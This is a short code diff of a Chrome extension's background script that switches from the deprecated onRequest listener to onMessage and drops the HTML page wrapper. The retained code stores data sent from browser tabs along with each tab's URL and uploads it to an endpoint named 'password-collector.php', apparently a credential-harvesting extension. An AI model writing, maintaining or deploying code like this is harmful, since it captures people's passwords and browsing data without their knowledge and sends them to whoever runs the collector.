@@ -1,7 +1,4 @@
-<html>
-<head>
-<script>
-chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
+chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
 	if(request && request.type === "store") {
 		var data = {data: request.data, url: sender.tab.url};
 		var id = parseInt(localStorage.getItem("counter"), 10);
@@ -44,6 +41,3 @@ function upload() {
 	xhr.open("POST", "http://localhost/password-collector.php");
 	xhr.send(formdata);
 }
-</script>
-</head>
-</html>
